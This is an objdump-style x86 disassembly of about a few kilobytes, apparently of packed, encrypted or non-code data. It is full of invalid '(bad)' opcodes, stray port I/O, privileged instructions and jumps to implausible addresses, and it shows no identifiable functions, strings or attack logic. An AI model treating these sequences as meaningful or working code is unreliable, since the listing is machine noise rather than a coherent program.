  41fa2a:	add    DWORD PTR [eax+eiz*2+0x76],esi
  41fa2e:	pusha  
  41fa2f:	neg    DWORD PTR [ecx]
  41fa31:	push   bp
  41fa33:	xor    eax,0xb0cc73b6
  41fa38:	and    edx,DWORD PTR [edi+0x1e]
  41fa3b:	sbb    ch,BYTE PTR [edx-0x5a]
  41fa3e:	mov    ch,0x6b
  41fa40:	mov    dl,0x4d
  41fa42:	fcomip st,st(4)
  41fa44:	lods   al,BYTE PTR ds:[esi]
  41fa45:	rcl    DWORD PTR [edi+edx*1+0x55],cl
  41fa49:	and    ch,BYTE PTR [eax-0x2d]
  41fa4c:	or     BYTE PTR [esi-0x45],dh
  41fa4f:	dec    ebx
  41fa50:	leave  
  41fa51:	pop    ecx
  41fa52:	xchg   edx,eax
  41fa53:	mov    dh,0x99
  41fa55:	test   eax,0x59f64172
  41fa5a:	push   eax
  41fa5b:	jno    0x41fa30
  41fa5d:	cwde   
  41fa5e:	cmp    ecx,ecx
  41fa60:	cmp    al,0xf7
  41fa62:	jge    0x41fac9
  41fa64:	ret    0x702b
  41fa67:	rcr    esp,1
  41fa69:	or     al,0xb5
  41fa6b:	sub    al,0x40
	...
  41fad5:	add    BYTE PTR [edx],cl
  41fad7:	inc    ecx
  41fad8:	mov    bh,0xa1
  41fada:	push   edi
  41fadc:	push   ds
  41fadd:	jmp    0x41fb02
  41fadf:	push   edi
  41fae0:	mov    ds:0xef38f915,eax
  41fae5:	and    eax,0x153ea
  41faea:	inc    DWORD PTR [eax]
  41faec:	add    BYTE PTR [eax],al
  41faee:	xlat   BYTE PTR ds:[ebx]
  41faef:	xchg   esp,eax
  41faf0:	imul   edx,DWORD PTR [edi-0x344816cb],0xe06e5774
  41fafa:	add    bh,al
  41fafc:	mov    ch,bh
  41fafe:	and    al,0xa4
  41fb00:	in     eax,0x27
  41fb02:	pop    esi
  41fb03:	addr16 pop eax
  41fb05:	sbb    eax,0xbe205a84
  41fb0a:	outs   dx,BYTE PTR ds:[esi]
  41fb0b:	std    
  41fb0c:	scas   eax,DWORD PTR es:[edi]
  41fb0d:	dec    edx
  41fb0e:	jle    0x41fb4b
  41fb10:	sbb    ch,dh
  41fb12:	call   0x3a8f1f37
  41fb17:	xor    bh,BYTE PTR [ebx-0x40]
  41fb1a:	xor    BYTE PTR [esi+edx*2+0x48f13045],bl
  41fb21:	in     eax,dx
  41fb22:	inc    eax
  41fb23:	ds jg  0x41fb47
  41fb26:	in     eax,dx
  41fb27:	out    0xdd,eax
  41fb29:	mov    edx,0x89150e16
  41fb2e:	ins    BYTE PTR es:[edi],dx
  41fb2f:	test   eax,0x66c4584a
  41fb34:	in     al,dx
  41fb35:	dec    edi
  41fb36:	push   0xffffff86
  41fb38:	retf   0x9c34
  41fb3b:	fwait
  41fb3c:	in     eax,0x2c
  41fb3e:	loope  0x41fb8d
  41fb40:	push   edi
  41fb41:	ds inc esp
  41fb43:	xchg   esp,eax
  41fb44:	call   0x890a:0x43f6fa7e
  41fb4b:	data16 (bad) 
  41fb4d:	(bad)  
  41fb4e:	and    DWORD PTR [edx],ebp
  41fb50:	mov    esi,0x55ff5b8a
  41fb55:	arpl   WORD PTR [ebp-0x74],cx
  41fb58:	pop    es
  41fb59:	loope  0x41fb64
  41fb5b:	repnz aaa 
  41fb5d:	sbb    BYTE PTR [edx],al
  41fb5f:	nop
  41fb60:	shr    DWORD PTR [esi],cl
  41fb62:	shr    BYTE PTR [ebx],0xaa
  41fb65:	call   0x3eae:0x2946ef1b
  41fb6c:	dec    esi
  41fb6d:	cmp    ecx,ebx
  41fb6f:	mov    ebx,0x675bc016
  41fb74:	cld    
  41fb75:	jg     0x41fb86
  41fb77:	mov    eax,ds:0x8a9b0176
  41fb7c:	sbb    DWORD PTR [esi],eax
  41fb7e:	pusha  
  41fb7f:	inc    edi
  41fb80:	loopne 0x41fb64
  41fb82:	pop    ds
  41fb83:	fs inc edx
  41fb85:	mov    eax,0x1397245c
  41fb8a:	sbb    eax,0xb294c711
  41fb8f:	mov    ebx,DWORD PTR [ecx+edx*1-0x76215cc0]
  41fb96:	pop    esp
  41fb97:	or     BYTE PTR [ebp+0x3792f9ff],ch
  41fb9d:	mov    edx,edx
  41fb9f:	jbe    0x41fbbb
  41fba1:	jb     0x41fc1f
  41fba3:	mov    dh,0x89
  41fba5:	fnsave [edi+ebx*4-0x31]
  41fba9:	outs   dx,DWORD PTR ds:[esi]
  41fbaa:	in     al,0x47
  41fbac:	clc    
  41fbad:	inc    edi
  41fbae:	pop    edx
  41fbaf:	ret    0x18c1
  41fbb2:	pop    ebp
  41fbb3:	out    dx,eax
  41fbb4:	push   edx
  41fbb5:	(bad)  [eax+0x235099a0]
  41fbbb:	lahf   
  41fbbc:	and    ch,ah
  41fbbe:	sub    eax,0xc67b6838
  41fbc3:	out    0x5d,al
  41fbc5:	dec    ebp
  41fbc6:	ret    0xe1e5
  41fbc9:	xchg   esi,eax
  41fbca:	sbb    eax,0x8bc45e25
  41fbcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbd0:	iret   
  41fbd1:	lea    edi,[ebx+ebp*2-0x2e]
  41fbd5:	in     eax,0x7b
  41fbd7:	cli    
  41fbd8:	or     ebp,DWORD PTR [ebx]
  41fbda:	mov    ecx,0xccc3e995
  41fbdf:	ret    0xb6e8
  41fbe2:	push   ecx
  41fbe3:	popa   
  41fbe4:	in     al,0xf0
  41fbe6:	inc    ebx
  41fbe7:	xlat   BYTE PTR ds:[ebx]
  41fbe8:	fidivr WORD PTR [edi]
  41fbea:	fimul  DWORD PTR [ebp+0x9b]
	...
  41fc54:	add    BYTE PTR [eax],al
  41fc56:	fsubr  QWORD PTR [eax]
  41fc58:	mov    ah,ah
  41fc5a:	(bad)  
  41fc5b:	out    0xfe,al
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	lea    ebp,[edi-0x58]
  41fc65:	sbb    ecx,ebp
  41fc67:	push   esp
  41fc68:	add    DWORD PTR [eax],eax
  41fc6a:	inc    DWORD PTR [eax]
  41fc6c:	add    BYTE PTR [eax],al
  41fc6e:	out    dx,ax
  41fc70:	or     al,0xf0
  41fc72:	cwde   
  41fc73:	icebp  
  41fc74:	adc    eax,0x4b4e57c5
  41fc79:	out    dx,al
  41fc7a:	imul   ebx,esi,0x3f
  41fc7d:	hlt    
  41fc7e:	lods   al,BYTE PTR ds:[esi]
  41fc7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc80:	arpl   WORD PTR [ebp-0x11],sp
  41fc83:	stos   DWORD PTR es:[edi],eax
  41fc84:	sub    eax,0x60a7058
  41fc89:	cwde   
  41fc8a:	and    eax,0xb5c8ecc0
  41fc8f:	int    0xda
  41fc91:	adc    DWORD PTR [edi+0x5f],esp
  41fc94:	jne    0x41fc76
  41fc96:	or     ebx,DWORD PTR [ebx+0x30]
  41fc99:	lea    ecx,[ebx+eiz*1+0x5d]
  41fc9d:	ret    
  41fc9e:	push   esp
  41fc9f:	retf   
  41fca0:	push   edx
  41fca1:	rcl    bh,0x2d
  41fca4:	dec    eax
  41fca5:	xchg   BYTE PTR [ebx-0x3b],cl
  41fca8:	ret    
  41fca9:	inc    esp
  41fcaa:	mov    ch,0x31
  41fcac:	in     eax,0x97
  41fcae:	inc    esp
  41fcaf:	cmp    edi,ebx
  41fcb1:	or     DWORD PTR [ebp-0x7579eed3],edi
  41fcb7:	int    0x25
  41fcb9:	sahf   
  41fcba:	lock cld 
  41fcbc:	cmc    
  41fcbd:	pop    es
  41fcbe:	lock mov ss,WORD PTR [esi-0xc]
  41fcc2:	push   edi
  41fcc3:	pop    ebp
  41fcc4:	cmp    eax,0xa6d5ad26
  41fcc9:	cmp    eax,0xc677e5df
  41fcce:	add    eax,0xd4939600
  41fcd3:	push   esi
  41fcd4:	fnstsw WORD PTR [edi+0x188b3c4b]
  41fcda:	rol    DWORD PTR [edi-0x29962d56],1
  41fce0:	inc    eax
  41fce1:	jmp    0xdde664c0
  41fce6:	adc    DWORD PTR [ebx+ecx*2],edi
  41fce9:	fisubr WORD PTR [ebp-0x6]
  41fcec:	fcomp  QWORD PTR [edx-0x21f5b40]
  41fcf2:	test   al,0x81
  41fcf4:	addr16 dec esp
  41fcf6:	ins    DWORD PTR es:[edi],dx
  41fcf7:	mov    dl,0xce
  41fcf9:	sub    DWORD PTR [edx-0x51],edx
  41fcfc:	cmc    
  41fcfd:	xor    ecx,DWORD PTR [edi]
  41fcff:	not    bl
  41fd01:	cmp    eax,0x7bad39dd
  41fd06:	std    
  41fd07:	adc    al,0xd7
  41fd09:	sub    BYTE PTR [eax-0x51],cl
  41fd0c:	xor    BYTE PTR ds:0xf32ebfff,cl
  41fd12:	add    al,0x5e
  41fd14:	ret    0x2981
  41fd17:	imul   ebp,DWORD PTR [edi],0x43
  41fd1a:	arpl   WORD PTR [esi-0x4e],dx
  41fd1d:	xor    BYTE PTR [ebp+0x2e9f7f5f],bl
  41fd23:	fcom   QWORD PTR ds:0xeeb2f9e5
  41fd2a:	fwait
  41fd2b:	(bad)  
  41fd2c:	jbe    0x41fcd3
  41fd2e:	add    BYTE PTR [ebp-0x4bb7aa00],0xd8
  41fd35:	add    eax,0x59182932
  41fd3a:	cli    
  41fd3b:	outs   dx,DWORD PTR ds:[esi]
  41fd3c:	cmp    al,0x90
  41fd3e:	stos   DWORD PTR es:[edi],eax
  41fd3f:	pop    esp
  41fd40:	int3   
  41fd41:	iret   
  41fd42:	popa   
  41fd43:	jae    0x41fd29
  41fd45:	inc    edx
  41fd46:	out    0x30,eax
  41fd48:	neg    DWORD PTR [edx-0x1911964d]
  41fd4e:	fstp   TBYTE PTR [esi-0x1b8afd06]
  41fd54:	jo     0x41fcda
  41fd56:	pop    esp
  41fd57:	js     0x41fdab
  41fd59:	dec    edi
  41fd5a:	xchg   ebp,eax
  41fd5b:	fcomp  DWORD PTR [ecx-0x7e]
  41fd5e:	out    dx,al
  41fd5f:	ja     0x41fdba
  41fd61:	xchg   DWORD PTR fs:[ecx],esi
  41fd64:	je     0x41fd0b
  41fd66:	aaa    
  41fd67:	inc    ecx
  41fd68:	jb     0x41fdb2
  41fd6a:	sub    ch,cl
  41fd6c:	lods   eax,DWORD PTR ds:[esi]
	...
  41fdd5:	add    BYTE PTR [edx+ebp*2],cl
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fde3:	(bad)  
  41fde4:	cmc    
  41fde5:	pop    eax
  41fde6:	call   0xff41ff40
  41fdeb:	add    BYTE PTR [eax],al
  41fded:	add    BYTE PTR [ebx],ch
  41fdef:	(bad)  
  41fdf0:	pusha  
  41fdf1:	sbb    BYTE PTR [edi+ebp*2+0x40ca538c],0x0
  41fdf9:	sub    eax,0x8b40ef40
  41fdfe:	hlt    
  41fdff:	call   0x8711d0cf
  41fe04:	jle    0x41fe6f
  41fe06:	cmc    
  41fe07:	lock mov esp,0x46ab4543
  41fe0d:	push   eax
  41fe0e:	stc    
  41fe0f:	mov    bl,0x32
  41fe11:	mov    cl,0xec
  41fe13:	fisubr WORD PTR [eax+0xd]
  41fe16:	scas   al,BYTE PTR es:[edi]
  41fe17:	pop    esi
  41fe18:	loope  0x41fddc
  41fe1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe1b:	pushf  
  41fe1c:	mov    eax,ds:0xdaa951d6
  41fe21:	sub    al,0x88
  41fe23:	mov    ch,0x5f
  41fe25:	jle    0x41fe00
  41fe27:	mov    ecx,0x23388e6
  41fe2c:	addr16 into 
  41fe2e:	xchg   edx,eax
  41fe2f:	sbb    eax,DWORD PTR ss:[ebp-0x45bca444]
  41fe36:	mov    esp,0x6e95d66b
  41fe3b:	inc    ecx
  41fe3c:	stc    
  41fe3d:	clc    
  41fe3e:	dec    edi
  41fe3f:	cmp    eax,0x8fc46a4a
  41fe44:	push   es
  41fe45:	je     0x41fdf1
  41fe47:	mov    WORD PTR [edi],ds
  41fe49:	ret    
  41fe4a:	sub    DWORD PTR [edx],eax
  41fe4c:	mov    esp,0xde233054
  41fe51:	(bad)  
  41fe52:	sub    al,0xfe
  41fe54:	ds pop esp
  41fe56:	repz std 
  41fe58:	les    ecx,FWORD PTR [ebx-0x3f]
  41fe5b:	xchg   edi,eax
  41fe5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe5d:	xchg   ebp,eax
  41fe5e:	fbstp  TBYTE PTR [ebp-0x79b7be94]
  41fe64:	mov    al,ds:0x6ad64e65
  41fe69:	outs   dx,DWORD PTR ds:[esi]
  41fe6a:	xchg   DWORD PTR [esi-0x1654e1bd],ebx
  41fe70:	push   esi
  41fe71:	ja     0x41fe5c
  41fe73:	push   ebp
  41fe74:	(bad)  
  41fe75:	jmp    0x41fe48
  41fe77:	shr    edx,1
  41fe79:	xor    bl,ch
  41fe7b:	and    BYTE PTR [edi+0x2468f461],bl
  41fe81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe82:	xchg   ebp,eax
  41fe83:	add    DWORD PTR [esi+eiz*8-0x4b],eax
  41fe87:	sub    esi,edx
  41fe89:	fwait
  41fe8a:	jne    0x41fee1
  41fe8c:	jae    0x41fe14
  41fe8e:	lds    ebx,FWORD PTR [edi]
  41fe90:	jae    0x41fecf
  41fe92:	xor    DWORD PTR [esp+ebx*8-0x4e1d8752],0xffffffe3
  41fe9a:	pop    ecx
  41fe9b:	inc    ebx
  41fe9c:	jno    0x41fec7
  41fe9e:	pusha  
  41fe9f:	adc    BYTE PTR [edx],bl
  41fea1:	dec    ebp
  41fea2:	adc    al,al
  41fea4:	inc    ebp
  41fea5:	xchg   edi,eax
  41fea6:	pop    ds
  41fea7:	mov    ebp,0xe2fa3f7b
  41feac:	cli    
  41fead:	rcr    DWORD PTR [ecx+0xa],cl
  41feb0:	scas   eax,DWORD PTR es:[edi]
  41feb1:	adc    al,0xc
  41feb3:	cmc    
  41feb4:	fwait
  41feb5:	push   0xf6d031ee
  41feba:	cdq    
  41febb:	cmp    dl,al
  41febd:	in     eax,0xdc
  41febf:	sub    bl,al
  41fec1:	jl     0x41feae
  41fec3:	popf   
  41fec4:	aam    0xe3
  41fec6:	mov    WORD PTR [eax],?
  41fec8:	pop    ebx
  41fec9:	push   ebp
  41feca:	ror    BYTE PTR [ebp+0x6],0xfa
  41fece:	(bad)  
  41fecf:	or     ebp,DWORD PTR [ecx-0x44]
  41fed2:	ror    BYTE PTR [ecx+0x46],cl
  41fed5:	imul   eax,DWORD PTR [ebp-0x2d],0x864ab0b3
  41fedc:	scas   eax,DWORD PTR es:[edi]
  41fedd:	int    0x98
  41fedf:	jo     0x41fee4
  41fee1:	test   eax,0x2d9b5e48
  41fee6:	push   esi
  41fee7:	fnstsw WORD PTR [ecx]
  41fee9:	and    ax,0xa8a3
	...
  41ff55:	add    BYTE PTR [edx-0x1865ab],ch
  41ff5b:	out    dx,eax
  41ff5c:	call   FWORD PTR [ebp-0x5]
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0x2c
  41ff63:	pop    es
  41ff64:	jnp    0x41ff54
  41ff66:	out    0x56,eax
  41ff68:	add    DWORD PTR [eax],eax
  41ff6a:	inc    DWORD PTR [eax]
  41ff6c:	add    BYTE PTR [eax],al
  41ff6e:	mov    al,ds:0xc1ebe8a2
  41ff73:	xlat   BYTE PTR ds:[ebx]
  41ff74:	and    DWORD PTR [edi+eiz*8],ecx
  41ff77:	add    DWORD PTR [ecx+ecx*4],ecx
  41ff7a:	jmp    0xb08:0x9f2ab56b
  41ff81:	adc    bh,bh
  41ff83:	cdq    
  41ff84:	in     al,dx
  41ff85:	sbb    al,0x6
  41ff87:	push   ds
  41ff88:	lods   al,BYTE PTR ds:[esi]
  41ff89:	ffreep st(2)
  41ff8b:	or     al,0x5
  41ff8d:	nop
  41ff8e:	test   eax,0xa6f4d178
  41ff93:	jg     0x41ff26
  41ff95:	mov    dh,BYTE PTR [edx+0x6a22bbc4]
  41ff9b:	or     eax,0x8cf6c2eb
  41ffa0:	pop    edx
  41ffa1:	sbb    al,0xef
  41ffa3:	in     eax,0x8
  41ffa5:	inc    esp
  41ffa6:	fimul  WORD PTR [ebx+0x26]
  41ffa9:	pop    ss
  41ffaa:	jno    0x41ff54
  41ffac:	(bad)  [ebx-0x4e014043]
  41ffb2:	push   0x92989e29
  41ffb7:	imul   edi,DWORD PTR [esi+edx*2-0x6817c70a],0xf4a3e9af
  41ffc2:	pop    ss
  41ffc3:	jne    0x41ffd2
  41ffc5:	mov    ds:0x71cbaf2b,al
  41ffca:	fld    DWORD PTR [esp+edx*2]
  41ffcd:	fbld   TBYTE PTR [ebx]
  41ffcf:	dec    esi
  41ffd0:	mov    bl,0x82
  41ffd2:	icebp  
  41ffd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffd4:	xchg   ebx,eax
  41ffd5:	xor    DWORD PTR [esi],0x23749d06
  41ffdb:	xor    ebx,DWORD PTR [eax+0x65]
  41ffde:	xor    eax,0xec636b04
  41ffe3:	test   eax,0xe08badd7
  41ffe8:	dec    ebx
  41ffe9:	cwde   
  41ffea:	xchg   edi,eax
  41ffeb:	push   ss
  41ffec:	pop    es
  41ffed:	(bad)  
  41ffef:	popf   
  41fff0:	sti    
  41fff1:	sub    DWORD PTR [esp+ecx*2+0x22],esp
  41fff5:	mov    bh,0x8
  41fff7:	inc    ecx
  41fff8:	or     BYTE PTR [eax+0x1fa22782],0x98
  41ffff:	loopne 0x420001
  420001:	fild   DWORD PTR [esi+0x7766d147]
  420007:	lahf   
  420008:	xchg   ebp,eax
  420009:	inc    ebx
  42000a:	dec    esi
  42000b:	jle    0x420049
  42000d:	sahf   
  42000e:	inc    esi
  42000f:	lods   al,BYTE PTR ds:[esi]
  420010:	or     al,0x19
  420012:	popa   
  420013:	ins    DWORD PTR es:[edi],dx
  420014:	xchg   BYTE PTR [ecx-0x46cecabb],ch
  42001a:	stc    
  42001b:	pop    edx
  42001c:	mov    esp,0xf0cc732
  420021:	int    0xde
  420023:	xchg   BYTE PTR [ebx-0x22],dl
  420026:	xchg   edx,eax
  420027:	scas   al,BYTE PTR es:[edi]
  420028:	xchg   edi,eax
  420029:	inc    ebp
  42002a:	or     eax,0x50e01b14
  42002f:	pop    edx
  420030:	(bad)  
  420031:	dec    ebx
  420032:	iret   
  420033:	cli    
  420034:	(bad)  
  420035:	adc    eax,esp
  420037:	sub    edx,ebx
  420039:	sub    DWORD PTR [edx-0x64],0xe9558a5e
  420040:	push   ecx
  420041:	lods   eax,DWORD PTR ds:[esi]
  420042:	repz or eax,0x59c2c0e2
  420048:	sahf   
  420049:	(bad)  ss:[ecx+0x17]
  42004d:	push   ss
  42004e:	dec    eax
  42004f:	out    0x1,eax
  420051:	mov    ds:0x94736ef6,eax
  420056:	rcr    BYTE PTR [ebx+0x18],0xb6
  42005a:	mov    DWORD PTR [ecx+ebx*1+0x55],esp
  42005e:	mov    al,0xf2
  420060:	cmp    esp,ebx
  420062:	test   DWORD PTR [edx+0x1d35b1a],edx
  420068:	out    0x2,al
  42006a:	cmp    eax,0xa837
	...
  4200d3:	add    BYTE PTR [eax],al
  4200d5:	add    BYTE PTR [edx-0x5b],ah
  4200d8:	jbe    0x420159
  4200da:	idiv   edi
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffffc2
  4200e3:	lds    ebx,FWORD PTR ds:[edi+0x157e6]
  4200ea:	inc    DWORD PTR [eax]
  4200ec:	add    BYTE PTR [eax],al
  4200ee:	sub    DWORD PTR [ebx],0xffffff95
  4200f1:	ret    0x80f3
  4200f4:	out    0xa0,al
  4200f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200f7:	daa    
  4200f8:	scas   al,BYTE PTR es:[edi]
  4200f9:	pop    ebp
  4200fa:	shl    DWORD PTR [esp+esi*2-0xe],1
  4200fe:	clc    
  4200ff:	push   eax
  420100:	fcmovbe st,st(0)
  420102:	add    eax,0x62e94b5c
  420107:	loope  0x420142
  420109:	cmp    DWORD PTR [edx],edx
  42010b:	(bad)  [eax]
  42010d:	mov    esi,0x85413860
  420112:	push   esi
  420113:	sub    eax,0x988644e8
  420118:	sahf   
  420119:	mov    dl,BYTE PTR [ecx]
  42011b:	sbb    BYTE PTR [esi+0x53],dh
  42011e:	or     DWORD PTR [ecx-0x2a351ed3],ebp
  420124:	fdiv   DWORD PTR [edx-0x61a02b2c]
  42012a:	icebp  
  42012b:	inc    ebx
  42012c:	mov    BYTE PTR ds:0x81a61dec,dl
  420132:	fst    DWORD PTR [eax-0x48e51a8c]
  420138:	fisub  DWORD PTR [esi*1+0x2e856670]
  42013f:	pop    edx
  420140:	sub    ebp,DWORD PTR [ebx-0x62262e76]
  420146:	xchg   esp,eax
  420147:	jle    0x4201b3
  420149:	pop    ebp
  42014a:	inc    esi
  42014b:	push   edi
  42014d:	bound  esp,QWORD PTR [edx-0x21]
  420150:	pop    eax
  420151:	or     ebp,0x70502973
  420157:	and    BYTE PTR [esi-0x7e6ab129],ch
  42015d:	pop    esi
  42015e:	and    al,0xcd
  420160:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420161:	xor    ecx,DWORD PTR [edx+ebp*2-0x63]
  420165:	mov    DWORD PTR [edx],eax
  420167:	repz pop ebp
  420169:	push   ss
  42016a:	cmp    al,0x89
  42016c:	in     al,dx
  42016d:	test   eax,0x7e545340
  420172:	sub    BYTE PTR [edi+0x5],0x9c
  420176:	mov    ds:0x76528763,eax
  42017b:	jb     0x42019c
  42017d:	cdq    
  42017e:	mov    ?,WORD PTR [esi+ebx*8]
  420181:	cmp    eax,0x8a190bf7
  420186:	mov    bh,BYTE PTR [eax-0x33e7f4a]
  42018c:	lods   al,BYTE PTR ds:[esi]
  42018d:	mov    gs,WORD PTR [edi-0x295fcc3b]
  420193:	test   eax,0x5a79360a
  420198:	dec    edx
  420199:	out    dx,eax
  42019a:	scas   eax,DWORD PTR es:[edi]
  42019b:	inc    esi
  42019c:	ret    
  42019d:	push   ebp
  42019e:	rcl    esi,1
  4201a0:	test   al,0xf5
  4201a2:	pushf  
  4201a3:	loope  0x4201ad
  4201a5:	ja     0x4201f4
  4201a7:	(bad)  
  4201a8:	pusha  
  4201a9:	loopne 0x42015f
  4201ab:	loopne 0x4201e6
  4201ad:	jnp    0x4201aa
  4201af:	xor    al,0xa9
  4201b1:	pop    DWORD PTR [edi+0x8]
  4201b4:	out    dx,eax
  4201b5:	adc    bl,BYTE PTR [esi+0x3b]
  4201b8:	inc    ebp
  4201b9:	sbb    BYTE PTR [ebx+eiz*2+0x7f2cada1],bh
  4201c0:	mov    ebx,esp
  4201c2:	enter  0x180b,0x2d
  4201c6:	pop    esp
  4201c7:	loop   0x4201ef
  4201c9:	jp     0x42022f
  4201cb:	xor    ebx,DWORD PTR [esi+0x15468a88]
  4201d1:	test   BYTE PTR [edi+0x749458e],0x81
  4201d8:	shr    DWORD PTR [eax+0x3],0xb2
  4201dc:	sbb    al,0x6b
  4201de:	mov    cl,0x7a
  4201e0:	aas    
  4201e1:	loop   0x4201de
  4201e3:	loope  0x4201b0
  4201e5:	inc    eax
  4201e6:	dec    ecx
  4201e7:	mov    esp,0x51784945
  4201ec:	sub    eax,DWORD PTR [eax]
	...
  420256:	jae    0x420227
  420258:	fwait
  420259:	cmp    DWORD PTR [edi-0x27300c83],edi
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sar    BYTE PTR [ebx-0x7d005425],1
  420266:	in     eax,0x58
  420268:	add    DWORD PTR [eax],eax
  42026a:	inc    DWORD PTR [eax]
  42026c:	add    BYTE PTR [eax],al
  42026e:	xchg   BYTE PTR [ecx+0x38],ch
  420271:	push   es
  420272:	xor    eax,0x10c4bbf8
  420277:	mov    ebp,DWORD PTR [eax+eiz*8-0x64070436]
  42027e:	wrmsr  
  420280:	fild   WORD PTR ds:0xd7db35f1
  420286:	sbb    eax,0x1071ca56
  42028b:	pop    ebx
  42028c:	mov    dl,0x34
  42028e:	pop    ecx
  42028f:	fisttp QWORD PTR [edx+0x5002b833]
  420295:	int    0xd1
  420297:	imul   eax,DWORD PTR [ebx-0x61001d8c],0x159e9e99
  4202a1:	test   eax,0x7623ff2f
  4202a6:	cmc    
  4202a7:	std    
  4202a8:	adc    eax,0x89261742
  4202ad:	out    0x5d,al
  4202af:	push   0x79
  4202b1:	push   ss
  4202b2:	mov    dh,0xa5
  4202b4:	and    edx,DWORD PTR [edx+ebx*1+0x9]
  4202b8:	mov    BYTE PTR [ecx+0x27274854],dh
  4202be:	pop    ebp
  4202bf:	addr16 adc eax,0x5d7f534b
  4202c5:	adc    BYTE PTR [ebx+0x228cde94],bl
  4202cb:	xchg   esi,eax
  4202cc:	pop    eax
  4202cd:	loopne 0x4202a2
  4202cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202d0:	stc    
  4202d1:	inc    ecx
  4202d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202d3:	or     al,0xbe
  4202d5:	scas   al,BYTE PTR es:[edi]
  4202d6:	mov    eax,0x72869076
  4202db:	arpl   dx,bx
  4202dd:	mov    BYTE PTR [edi+0x1935e72b],dh
  4202e3:	adc    DWORD PTR [edx],ebx
  4202e5:	(bad)  
  4202e6:	fiadd  WORD PTR [ecx]
  4202e8:	ret    
  4202e9:	inc    edi
  4202ea:	(bad)  
  4202eb:	cmp    eax,0xefb63390
  4202f0:	or     BYTE PTR [edi],cl
  4202f2:	pop    ebp
  4202f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202f4:	fsubr  DWORD PTR [ebx+edi*4+0x26]
  4202f8:	pop    ss
  4202f9:	in     al,dx
  4202fa:	inc    edi
  4202fb:	xchg   ebx,eax
  4202fc:	mov    ah,0x87
  4202fe:	push   0x24
  420300:	pop    ecx
  420301:	mov    eax,0x680131fb
  420306:	jp     0x4202de
  420308:	ret    
  420309:	xchg   ebp,eax
  42030a:	xchg   esp,eax
  42030b:	mov    ah,0x55
  42030d:	mov    dl,0xa3
  42030f:	pop    edi
  420310:	or     al,0xc6
  420312:	addr16 xchg esi,eax
  420314:	(bad)  
  420315:	repz ja 0x420365
  420318:	inc    edx
  420319:	and    esp,esp
  42031b:	data16 jmp 0x4202af
  42031e:	mov    cs,ecx
  420320:	jb     0x4203a1
  420322:	pop    edx
  420323:	inc    ebx
  420324:	ret    0x236f
  420327:	idiv   DWORD PTR ds:0x5a1891d8
  42032d:	and    al,dh
  42032f:	and    al,BYTE PTR [ebx+0x3b]
  420332:	sar    DWORD PTR [eax+0x76abd95e],cl
  420338:	adc    BYTE PTR [edx],ah
  42033a:	xchg   esp,eax
  42033b:	jbe    0x420352
  42033d:	adc    dl,ch
  42033f:	stc    
  420340:	mov    esp,DWORD PTR [eax+0x3]
  420343:	fld    QWORD PTR [ebx]
  420345:	mov    bl,bl
  420347:	aam    0x8d
  420349:	sbb    BYTE PTR [esi+eiz*1-0x36],dh
  42034d:	xchg   edi,eax
  42034e:	in     al,0xb2
  420350:	inc    esp
  420351:	mov    esi,0x71faef26
  420356:	mov    bl,0xe8
  420358:	push   0xb77b429c
  42035d:	sub    al,0x3c
  42035f:	fiadd  WORD PTR [esi+0x6e56250a]
  420365:	bound  esi,QWORD PTR [ecx+0x24]
  420368:	out    0xbc,eax
  42036a:	std    
  42036b:	xchg   edi,eax
  42036c:	lds    eax,FWORD PTR [eax]
	...
  4203d6:	inc    ecx
  4203d7:	push   es
  4203d8:	clc    
  4203d9:	mov    esi,0xff47feff
  4203de:	and    BYTE PTR [eax+0x2a],bh
  4203e1:	hlt    
  4203e2:	mov    eax,0xe4cde414
  4203e7:	pop    ecx
  4203e8:	add    DWORD PTR [eax],eax
  4203ea:	inc    DWORD PTR [eax]
  4203ec:	add    BYTE PTR [eax],al
  4203ee:	pusha  
  4203ef:	out    0x95,eax
  4203f1:	das    
  4203f2:	mov    ebx,ds
  4203f4:	pushf  
  4203f5:	call   0xdcb0:0xd4198c61
  4203fc:	mov    ch,0xe3
  4203fe:	add    al,0xbc
  420400:	mov    ah,0xfc
  420402:	jb     0x4203b8
  420404:	je     0x42044e
  420406:	adc    DWORD PTR [edi],eax
  420408:	xor    eax,0x8e38675c
  42040d:	lds    ebp,FWORD PTR [ebp+0x10]
  420410:	inc    esi
  420411:	mov    bh,0x5f
  420413:	mov    ?,ebx
  420415:	sahf   
  420416:	sbb    eax,0xa97085e1
  42041b:	xor    eax,0x2bfe1727
  420420:	sub    eax,0x8135aa93
  420425:	test   al,0x62
  420427:	sbb    eax,0xb898df05
  42042c:	push   esi
  42042d:	mov    ds:0xfb3f5b67,al
  420432:	cmp    DWORD PTR [ebp-0x3c],0x871f4283
  420439:	fdiv   DWORD PTR [esi+ecx*4-0x1d57cb09]
  420440:	int    0x49
  420442:	mov    al,ds:0xb182fb45
  420447:	adc    ebx,edx
  420449:	ficom  DWORD PTR [ebp+0x3f4fccb0]
  42044f:	je     0x4203ed
  420451:	or     BYTE PTR [eax+eax*1-0x32e56f86],bh
  420458:	mov    cl,0x9a
  42045a:	push   ebp
  42045b:	data16 outs dx,BYTE PTR ds:[esi]
  42045d:	idiv   DWORD PTR [edi-0x22f19126]
  420463:	xchg   esi,eax
  420464:	std    
  420465:	shr    BYTE PTR [edi+0x10],cl
